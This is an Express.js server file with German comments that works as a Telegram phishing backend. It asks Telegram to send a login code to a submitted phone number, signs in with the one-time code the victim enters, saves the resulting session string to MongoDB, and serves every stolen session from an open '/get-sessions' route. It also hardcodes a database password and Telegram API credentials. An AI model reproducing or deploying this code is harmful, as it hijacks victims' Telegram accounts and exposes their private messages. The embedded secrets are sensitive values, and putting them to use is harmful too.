const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;

// CORS Konfiguration
app.use(cors({
    origin: '*', // Erlaubt Anfragen von überall
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// MongoDB Setup (Datenbank für Sessions)
const MONGO_URI = 'mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0';
mongoose.connect(MONGO_URI)
    .then(() => console.log('DB Verbunden'))
    .catch(err => console.error('DB Verbindungsfehler:', err));

const SessionSchema = new mongoose.Schema({
    phone: String,
    session: String,
    createdAt: { type: Date, default: Date.now }
});
const SessionModel = mongoose.model('Session', SessionSchema);

// Telegram Config
const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
let client;
let phoneCodeHash;

// Route 1: Telefonnummer senden
app.post('/send-code', async (req, res) => {
    try {
        const { phone } = req.body;
        client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        
        const result = await client.sendCode({ apiId, apiHash }, phone);
        phoneCodeHash = result.phoneCodeHash;
        
        res.json({ success: true, message: 'Code gesendet' });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
});

// Route 2: OTP Code validieren
app.post('/verify-code', async (req, res) => {
    try {
        const { phone, code } = req.body;
        
        await client.signIn({
            apiId,
            apiHash,
            authKeyType: null,
            phoneNumber: phone,
            phoneCode: code,
            phoneCodeHash: phoneCodeHash
        });

        const stringSession = client.session.save();
        await SessionModel.create({ phone, session: stringSession });
        
        res.json({ success: true, message: 'Erfolgreich eingeloggt' });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
});

// Route 3: Admin Panel (Sessions abrufen)
app.get('/get-sessions', async (req, res) => {
    try {
        const sessions = await SessionModel.find();
        res.json(sessions);
    } catch (error) {
        res.status(500).json({ error: 'Fehler beim Laden' });
    }
});

app.listen(PORT, () => {
    console.log(`Server läuft auf Port ${PORT}`);
});
